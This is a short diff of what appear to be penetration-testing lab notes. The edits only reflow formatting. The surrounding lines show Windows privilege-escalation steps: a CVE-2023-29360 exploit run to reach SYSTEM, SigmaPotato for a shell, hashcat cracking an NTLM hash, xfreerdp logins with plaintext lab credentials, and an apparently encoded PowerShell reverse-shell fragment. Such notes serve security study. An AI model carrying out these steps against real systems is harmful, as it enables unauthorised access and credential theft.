@@ -3561,7 +3561,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     move .\VoiceActivation.exe .\Searches\
     ```
 - 17.3.2 Using Exploits
-  - Exploit CVE-2023-29360 to elevate privilege to NT AUTHORITY\SYSTEM
+  - Exploit CVE-2023-29360 to elevate privilege to NT AUTHORITY\SYSTEM  
     `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share`  
     `.\CVE-2023-29360.exe`  
   - Use SigmaPotato o obtain shell
@@ -3626,7 +3626,8 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
        echo "d94267c350fc02154f2aff04d384b354" > hash.txt
        hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
        ```
-    -  RDP enterpriseadmin `xfreerdp3 /u:enterpriseadmin /p:S3cureStore /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`  
+    -  RDP enterpriseadmin  
+       `xfreerdp3 /u:enterpriseadmin /p:S3cureStore /v:192.168.185.222 /cert:ignore /drive:share,/home/kali/share`  
 
 ### Linux Privilege Escalation  
 - 18.1.2 Manual Enumeration
